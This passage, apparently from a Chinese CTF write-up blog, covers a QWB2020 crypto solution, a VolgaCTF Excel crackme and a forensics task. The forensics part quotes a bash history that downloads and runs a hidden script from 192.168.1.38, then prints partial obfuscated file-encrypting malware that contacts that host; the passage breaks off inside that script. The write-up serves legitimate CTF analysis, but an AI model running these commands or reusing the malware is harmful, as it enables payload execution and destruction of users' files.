modexp(val, step, M)) % M</span><br><span class="line">        step = mul(step, k) % rrn(<span class="number">1</span>) <span class="comment"># step *= k % rrn(1)</span></span><br><span class="line">    <span class="comment"># 验证左右是否相等</span></span><br><span class="line">    <span class="keyword">return</span> left == acc</span><br><span class="line"></span><br><span class="line"><span class="comment"># 扩展欧几里得求逆元</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inv</span>(<span class="params">a, m</span>):</span><br><span class="line">    a0, a1 = <span class="number">1</span>, <span class="number">0</span></span><br><span class="line">    b0, b1 = a % m, m</span><br><span class="line">    <span class="keyword">while</span> b0 &gt; <span class="number">1</span>:</span><br><span class="line">        q = b1 // b0</span><br><span class="line">        a0, a1 = (a1 - mul(a0, q)), (b1 - mul(b0, q))</span><br><span class="line">        a0, b0, a1, b1 = a0, a1, a0, b0</span><br><span class="line">    <span class="keyword">return</span> a0 % m</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rtnr</span>(<span class="params">arr</span>):</span><br><span class="line">    <span class="comment"># 验证arr是否为列表或元组，且至少包含3个元素</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(arr, (<span class="built_in">list</span>, <span class="built_in">tuple</span>)) <span class="keyword">or</span> <span class="built_in">len</span>(arr) &lt; <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="comment"># 将arr变成键值对增加至hello</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27; 原hello</span></span><br><span class="line"><span class="string">    hello = &#123;</span></span><br><span class="line"><span class="string">    rrn(7):  (rrn(8),  rrn(9)),</span></span><br><span class="line"><span class="string">    rrn(10): (rrn(11), rrn(12)),</span></span><br><span class="line"><span class="string">    rrn(13): (rrn(14), rrn(15))&#125;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    hello = &#123;&#125;</span><br><span class="line">    hello = &#123;a: (b, c) <span class="keyword">for</span> a, b, c <span class="keyword">in</span> triple&#125;</span><br><span class="line">    <span class="keyword">for</span> a, b, c <span class="keyword">in</span> arr:</span><br><span class="line">        hello[a] = (b, c)</span><br><span class="line">    <span class="comment"># 组6</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(hello) != <span class="number">6</span>: <span class="comment"># 6</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="comment"># 验证hello的每一对键值对</span></span><br><span class="line">    <span class="keyword">for</span> k, (v1, v2) <span class="keyword">in</span> hello.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> verify(k, v1, v2):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># rrn(22), rrn(24),  rrn(26)</span></span><br><span class="line">        chosen = &#123;a <span class="keyword">for</span> a, b, c <span class="keyword">in</span> arr[:<span class="number">3</span>]&#125; </span><br><span class="line">        <span class="comment"># picked = [(rrn(22), a), (rrn(24), b), (rrn(26), c)]</span></span><br><span class="line">        picked = [(x, hello[x][<span class="number">0</span>]) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">sorted</span>(chosen) <span class="keyword">if</span> x <span class="keyword">in</span> hello]</span><br><span class="line">        <span class="comment"># [(rrn(7), rrn(9)), (rrn(10), rrn(12)), (rrn(13), rrn(15))]</span></span><br><span class="line">        leftovers = [(a, c) <span class="keyword">for</span> a, c, _ <span class="keyword">in</span> triple]  <span class="comment"># 原三元组里挑两个</span></span><br><span class="line">        rnrn = []</span><br><span class="line">        <span class="comment"># rnrn = [(rrn(22), a), (rrn(7), rrn(9)), (rrn(10), rrn(12))]</span></span><br><span class="line">        <span class="keyword">if</span> picked:</span><br><span class="line">            rnrn.append(picked[<span class="number">0</span>])</span><br><span class="line">        rnrn.extend(leftovers[:<span class="number">2</span>])</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(rnrn) &lt; <span class="number">3</span>:</span><br><span class="line">            <span class="comment"># 修正非法解包 True</span></span><br><span class="line">            rnrn = <span class="built_in">list</span>(((k, <span class="literal">True</span>) <span class="keyword">for</span> k, (tmp, v2) <span class="keyword">in</span> <span class="built_in">sorted</span>(hello.items())))[:<span class="number">3</span>]</span><br><span class="line">        base = <span class="number">0</span></span><br><span class="line">        <span class="comment"># 遍历rnrn的每一个点，</span></span><br><span class="line">        <span class="keyword">for</span> idx, (x, y) <span class="keyword">in</span> <span class="built_in">enumerate</span>(rnrn):</span><br><span class="line">            prod, sum_ = <span class="number">1</span>, <span class="number">1</span></span><br><span class="line">            <span class="keyword">for</span> j, (xj, yj) <span class="keyword">in</span> <span class="built_in">enumerate</span>(rnrn):</span><br><span class="line">                <span class="keyword">if</span> idx == j:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                prod = mul(prod, -xj) % rrn(<span class="number">1</span>)</span><br><span class="line">                sum_ = mul(sum_, x - xj) % rrn(<span class="number">1</span>)</span><br><span class="line">            tmp_ = mul(prod, inv(sum_, rrn(<span class="number">1</span>))) % rrn(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># 输入3个字符串，转换为int</span></span><br><span class="line">    a = <span class="built_in">int</span>.from_bytes(<span class="built_in">input</span>(<span class="string">&#x27;1:&#x27;</span>).strip().encode())</span><br><span class="line">    b = <span class="built_in">int</span>.from_bytes(<span class="built_in">input</span>(<span class="string">&#x27;2:&#x27;</span>).strip().encode())</span><br><span class="line">    c = <span class="built_in">int</span>.from_bytes(<span class="built_in">input</span>(<span class="string">&#x27;3:&#x27;</span>).strip().encode())</span><br><span class="line">    <span class="comment"># 打印rrn(0)到rrn(29)的值</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">        <span class="built_in">print</span>(i, rrn(i))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">import</span> ipdb; ipdb.set_trace()</span><br><span class="line">    <span class="comment"># embed()</span></span><br><span class="line">    ok = rtnr(([rrn(<span class="number">22</span>), a , rrn(<span class="number">23</span>)], [rrn(<span class="number">24</span>), b, rrn(<span class="number">25</span>)], [rrn(<span class="number">26</span>), c, rrn(<span class="number">27</span>)]))</span><br><span class="line">    <span class="keyword">if</span> ok:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Success!&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Fail&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>$$rrn(2)^{v1}*rrn(3)^{v2} \equiv rrn(4)<em>rrn(5)^{k}</em> rrn(6)^{k^2} \mod rrn(0)$$</p>
<p>对于模M的乘法群，由于M是素数，所以这个群包含所有与M互素的数，也就是1到M-1的所有整数。rrn(0-29)均在模M的乘法群中，且理论上可以相互表示（群里的元素理论上均可以由同一个生成元生成）。</p>
<p>对于以上式子，可令g&#x3D;rrn(2)，h&#x3D;rrn(3)，那么按照群元素可互相转化的性质将4、5、6转化为</p>
<p>$$rrn(4)&#x3D;g^{a_1}<em>h^{a_2} \ rrn(5)&#x3D;g^{a_3}<em>h^{a_4} \ rrn(6)&#x3D;g^{a_5}<em>h^{a_6} \ 那么g^{v1}<em>h^{v2} \equiv g^{a_1+a_3</em>k+a_5</em>k^2}<em>h^{a_2+a_4</em>k+a_6</em>k^2} \mod M\ 可得v1\equiv a_1+a_3</em>k+a_5<em>k^2 \mod org(g),v2\equiv a_2+a_4</em>k+a_6*k^2 \mod org(h)$$</p>
<p>而对于模M的乘法群，由于M是素数，其乘法群的阶是 ϕ(M)&#x3D;M−1，并发现ϕ(M)&#x3D;M−1&#x3D;2⋅rrn(1)，且verify(k, v1, v2)函数中，<code>step = mul(step, k) % rrn(1)</code>可以看出，所有的k必须都能整除rrn(1)，因此可认为rrn(1)是群的阶，所以群元素g和h的阶也是rrn(1)，即</p>
<p>$$g^{rrn(1)}≡1\mod M\ 且h^{rrn(1)}≡1\mod M$$</p>
<p>因此化简后可得</p>
<p>$$v1\equiv a_1+a_3<em>k+a_5</em>k^2 \mod rrn(1)\ v2\equiv a_2+a_4<em>k+a_6</em>k^2 \mod rrn(1)$$</p>
<p>将triple中的三组数带入，拉格朗日插值即可求得多项式系数。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sage exp.sage</span></span><br><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">q = <span class="number">2072401646708888065655225658747614353249565120522358335925242055144090041187149544083229647724359</span></span><br><span class="line">triple = [(<span class="number">51966</span>, <span class="number">480442839669953990717445646260333383833736214883976558477525831992994289143305421629761482429714</span>, <span class="number">680701978345522085049694956190292511497787092168524280991013677878931201637910598103187515536181</span>), (<span class="number">47806</span>, <span class="number">253717457675323180603201716971045682091261518437666533915787790782521696917056900361404824269689</span>, <span class="number">99768326317759269813131181172947299870925613919195157126671930387206518545837120733862757382354</span>), (<span class="number">201527</span>, <span class="number">782319055923618868639890136618720319997476308047895888006842867173403800015590219030945524995543</span>, <span class="number">944213788775446264472010893716848921879528565854393198519311752189219209422386607874556309845161</span>)]</span><br><span class="line"></span><br><span class="line">Fq = GF(q) </span><br><span class="line">points_v1 = [(Fq(point[<span class="number">0</span>]), Fq(point[<span class="number">1</span>])) <span class="keyword">for</span> point <span class="keyword">in</span> triple] <span class="comment"># [(k1, v11), (k2, v12), (k3, v13)]</span></span><br><span class="line">points_v2 = [(Fq(point[<span class="number">0</span>]), Fq(point[<span class="number">2</span>])) <span class="keyword">for</span> point <span class="keyword">in</span> triple] <span class="comment"># [(k1, v21), (k2, v22), (k3, v23)]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 拟合 P1(k) = a1 + a3*k + a5*k^2</span></span><br><span class="line">R.&lt;x&gt; = Fq[] <span class="comment"># 定义多项式环</span></span><br><span class="line">P1 = R.lagrange_polynomial(points_v1) </span><br><span class="line"><span class="comment"># 拟合 P2(k) = a2 + a4*k + a6*k^2</span></span><br><span class="line">P2 = R.lagrange_polynomial(points_v2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 从多项式中提取系数</span></span><br><span class="line">coeffs_P1 = P1.coefficients(sparse=<span class="literal">False</span>)</span><br><span class="line">coeffs_P2 = P2.coefficients(sparse=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">a1 = coeffs_P1[<span class="number">0</span>] </span><br><span class="line">a3 = coeffs_P1[<span class="number">1</span>] </span><br><span class="line">a5 = coeffs_P1[<span class="number">2</span>] </span><br><span class="line">a2 = coeffs_P2[<span class="number">0</span>] </span><br><span class="line">a4 = coeffs_P2[<span class="number">1</span>] </span><br><span class="line">a6 = coeffs_P2[<span class="number">2</span>] </span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;a1 = <span class="subst">&#123;a1&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;a2 = <span class="subst">&#123;a2&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;a3 = <span class="subst">&#123;a3&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;a4 = <span class="subst">&#123;a4&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;a5 = <span class="subst">&#123;a5&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;a6 = <span class="subst">&#123;a6&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">rrn_22 = <span class="number">4919</span></span><br><span class="line">rrn_23 = <span class="number">132146363252892079238955852043754382244951307426448497798760465957265430114543661757753602857394</span></span><br><span class="line">rrn_24 = <span class="number">57005</span></span><br><span class="line">rrn_25 = <span class="number">775309903033854570882823603825659470664893675806480830434450057789819902048494192286724670375083</span></span><br><span class="line">rrn_26 = <span class="number">48879</span></span><br><span class="line">rrn_27 = <span class="number">118549588096765345719828273586922254620646262475213503758232906237813765902929584873401252181598</span></span><br><span class="line"></span><br><span class="line">a = a1 + a3 * Fq(rrn_22) + a5 * Fq(rrn_22)^<span class="number">2</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;a = <span class="subst">&#123;a&#125;</span>&quot;</span>)</span><br><span class="line">b = a1 + a3 * Fq(rrn_24) + a5 * Fq(rrn_24)^<span class="number">2</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;b = <span class="subst">&#123;b&#125;</span>&quot;</span>)</span><br><span class="line">c = a1 + a3 * Fq(rrn_26) + a5 * Fq(rrn_26)^<span class="number">2</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;c = <span class="subst">&#123;c&#125;</span>&quot;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">a1 = 559316565023500509472163049993035746991488808927332730492353543246322747488347594956218118830404</span></span><br><span class="line"><span class="string">a2 = 1455816338850548710226747826263500417489966228905173140760493856591277816261361853858359905028757</span></span><br><span class="line"><span class="string">a3 = 61893902729035082547018799981240740998667540081489595699162471822753113067844662646155561908655</span></span><br><span class="line"><span class="string">a4 = 301313555011896194349617605836195674760724652611645297927675988618321527633812527039080942153758</span></span><br><span class="line"><span class="string">a5 = 764625183014257783434933122874897790769847061090472271865906840925207049997560904718466470592181</span></span><br><span class="line"><span class="string">a6 = 1724301671569624190613193288495336271846478444752336504588582046652263520640553017091593670065559</span></span><br><span class="line"><span class="string">a = 871181771745415129676783034365082444498012594504484743519181302778728946421478110926096857920105</span></span><br><span class="line"><span class="string">b = 921176108142183962611682249614034391224389411635109144346285880896767581601955961667920137908837</span></span><br><span class="line"><span class="string">c = 794359266103212238415902312276062123896424792163905951086179313000078369166756222741109039129213</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2020/11/02/qwb2020-crypto/" data-id="cuidOvvP1WG2XapC7cKqzMiPm" data-title="qwb2020-crypto" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-2020volgactf" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/03/30/2020volgactf/" class="article-date">
  <time class="dt-published" datetime="2020-03-30T03:07:10.000Z" itemprop="datePublished">2020-03-30</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/03/30/2020volgactf/">VolgaCTF 2020</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="excellent-crackme-rev"><a href="#excellent-crackme-rev" class="headerlink" title="excellent-crackme-rev"></a>excellent-crackme-rev</h2><p>尼玛，用LibreOffice Calc打开exevl，vbs的密码自动解除…. 以后不用找工具了<br>提取出vbscript，关键代码实际就在<code>sub VolgaCTF</code>中，手动解混淆后如下:</p>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Private Sub <span class="title">VolgaCTF</span>()</span></span><br><span class="line"><span class="function">    Dim flag As String</span></span><br><span class="line"><span class="function">    Dim num As Long</span></span><br><span class="line"><span class="function">    Dim tmp As Long</span></span><br><span class="line"><span class="function">    Dim <span class="keyword">value</span> As Long</span></span><br><span class="line"><span class="function">    flag</span> = Range(<span class="string">&quot;L15&quot;</span>)</span><br><span class="line">    For i = <span class="number">1</span> <span class="function">To <span class="title">Len</span>(<span class="params">flag</span>)</span></span><br><span class="line"><span class="function">        num</span> = <span class="number">0</span></span><br><span class="line">        For j = <span class="number">1</span> <span class="function">To <span class="title">Len</span>(<span class="params">flag</span>)</span></span><br><span class="line"><span class="function">            tmp</span> = CInt(Cells(<span class="number">99</span> + i, <span class="number">99</span> + j).Value)</span><br><span class="line">            ch = Mid(flag, j, <span class="number">1</span>)</span><br><span class="line">            num = num + tmp * Asc(ch)</span><br><span class="line">            Next j</span><br><span class="line">            <span class="keyword">value</span> = CLng(Cells(<span class="number">99</span> + i, <span class="number">99</span> + Len(flag) + <span class="number">1</span>).Value)</span><br><span class="line">            If (<span class="keyword">value</span> &lt;&gt; num) <span class="function">Then</span></span><br><span class="line"><span class="function">                MsgBox <span class="title">mWfDCE1CY0a</span>(<span class="params"><span class="string">&quot;yrr9VuqqcETgYfVV&quot;</span></span>) &#x27;failed&#x27;</span></span><br><span class="line"><span class="function">                Exit Sub</span></span><br><span class="line"><span class="function">            End If</span></span><br><span class="line"><span class="function">            Next i</span></span><br><span class="line"><span class="function">    MsgBox <span class="title">mWfDCE1CY0a</span>(<span class="params"><span class="string">&quot;mq19VeLpVFr42H1d&quot;</span></span>)   &#x27;success&#x27;</span></span><br><span class="line"><span class="function">End Sub</span></span><br></pre></td></tr></table></figure>

<p>可见,flag是在execl中的数据计算产生的，数据在(100,100) cell后，如下图:<br><img src="http://tacqiniu.jagger2zr.com/20200331005140.png"></p>
<p>是一个多元一次线性方程组，用numpy求解</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment">#-*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> xlrd</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="comment"># VolgaCTF&#123;7h3_M057_M47h_cr4ckM3_y0u_3V3R_533N&#125;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_excel</span>(<span class="params">f</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        data = xlrd.open_workbook(f)</span><br><span class="line">        table = data.sheets()[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;open excel error&#x27;</span>)</span><br><span class="line">        exit(-<span class="number">1</span>)</span><br><span class="line">    a = []</span><br><span class="line">    b = []</span><br><span class="line">    <span class="keyword">for</span> row <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">99</span>,<span class="number">144</span>):</span><br><span class="line">        a.append(table.row_values(row)[<span class="number">99</span>:<span class="number">144</span>])</span><br><span class="line">        b.append(table.row_values(row)[<span class="number">144</span>])</span><br><span class="line">    <span class="keyword">return</span> (a,b)</span><br><span class="line"></span><br><span class="line">(x,y) = read_excel(<span class="string">&#x27;./VolgaCTF_excel_crackme.xlsm&#x27;</span>)</span><br><span class="line"></span><br><span class="line">x = np.array(x)</span><br><span class="line">y = np.array(y)</span><br><span class="line"></span><br><span class="line">r = np.linalg.solve(x,y)</span><br><span class="line">r = <span class="built_in">list</span>(r)</span><br><span class="line">r = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>,<span class="built_in">map</span>(<span class="built_in">round</span>,r)))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytearray</span>(r))</span><br></pre></td></tr></table></figure>

<h2 id="ScriptKiddie-forensics"><a href="#ScriptKiddie-forensics" class="headerlink" title="ScriptKiddie-forensics"></a>ScriptKiddie-forensics</h2><p>下载Ubuntu.ova后, 通过Recovery mode登录修改Root密码后登录系统.<br>Then we extracted the relevant files from <code>/home</code> which had two users prod and test:<br>在test下查看.bash_history:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">curl http://192.168.1.38/clev.py &gt; .s.py</span><br><span class="line">curl http://192.168.1.38:8080/clev.py &gt; .s.py</span><br><span class="line">curl http://192.168.1.38:8888/clev.py &gt; .s.py</span><br><span class="line">curl http://192.168.1.38:1111/clev.py &gt; .s.py</span><br><span class="line">file .s.py</span><br><span class="line">python3.7 .s.py</span><br><span class="line"><span class="built_in">rm</span> .s.py</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>发现作者下载了clev.py用来加密文件,<code>secrets.txt.enc</code>中很可能是加密后的flag </br><br>在prod用户下恰好记录了流量<code>EvaDump.pcap</code>(根据题目提示也可以得到该信息) </br><br>在Wireshark中设置Filter <code>http and ip.dst==192.168.1.38</code>找到curl流量中的clev.py:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line">F = <span class="built_in">len</span></span><br><span class="line">W = <span class="built_in">bytes</span></span><br><span class="line">L = <span class="built_in">open</span></span><br><span class="line">B = <span class="literal">True</span></span><br><span class="line">R = <span class="literal">False</span></span><br><span class="line">o = <span class="built_in">range</span></span><br><span class="line">l = exit</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">z = sys.platform</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">J = os.walk</span><br><span class="line">T = os.remove</span><br><span class="line">S = os.environ</span><br><span class="line"><span class="keyword">import</span> platform</span><br><span class="line">h = platform.system</span><br><span class="line">E = platform.machine</span><br><span class="line">e = platform.platform</span><br><span class="line">X = platform.node</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">a = hashlib.sha256</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">C = string.ascii_letters</span><br><span class="line">O = <span class="number">0</span></span><br><span class="line">N = <span class="number">1</span></span><br><span class="line">G = <span class="number">2</span></span><br><span class="line">g = (<span class="string">&#x27;192.168.1.38&#x27;</span>, <span class="number">9999</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">x</span>(<span class="params">u</span>):</span><br><span class="line">    y = <span class="number">16</span> - (F(u) % <span class="number">16</span>)</span><br><span class="line">    u += W([y]) * y</span><br><span class="line">    <span class="keyword">return</span> u</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">w</span>(<span class="params">u</span>):</span><br><span class="line">    u = u[:-u[-<span class="number">1</span>]]</span><br><span class="line">    <span class="keyword">return</span> u</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">U = [<span class="string">&#x27;.doc&#x27;</span>, <span class="string">&#x27;.txt&#x27;</span>, <span class="string">&#x27;.rc&#x27;</span>, <span class="string">&#x27;.ini&#x27;</span>, <span class="string">&#x27;.dat&#x27;</span>, <span class="string">&#x27;.conf&#x27;</span>, <span class="string">&#x27;_history&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">V</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">Q</span>):</span><br><span class="line">        f = X() + <span class="string">&#x27;//&#x27;</span> + e()</span><br><span class="line">        d = S[<span class="string">&#x27;HOME&#x27;</span>]</span><br><span class="line">        P = d.split(<span class="string">&#x27;/&#x27;</span>)[-<span class="number">1</span>]</span><br><span class="line">        v = E()</span><br><span class="line">        D = h()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> d:</span><br><span class="line">            <span class="keyword">import</span> getpass</span><br><span class="line">            P = getpass.getuser()</span><br><span class="line">            d = <span class="string">&#x27;/home/&#x27;</span> + P</span><br><span class="line">        b = <span class="string">&#x27;:&#x27;</span>.join(x <span class="keyword">for</span> x <span class="keyword">in</span>[f, v, D, P, d])</span><br><span class="line">        Q.<span class="built_in">id</span> = a(b.encode(<span class="string">&#x27;utf8&#x27;</span>)).hexdigest()</span><br><span class="line">        Q.system = D</span><br><span class="line">        Q.machine = v</span><br><span class="line">        Q.user = P</span><br><span class="line">        Q.home = d</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;linux&quot;</span> <span class="keyword">in</span> z:</span><br><span class="line">            Q.platform = 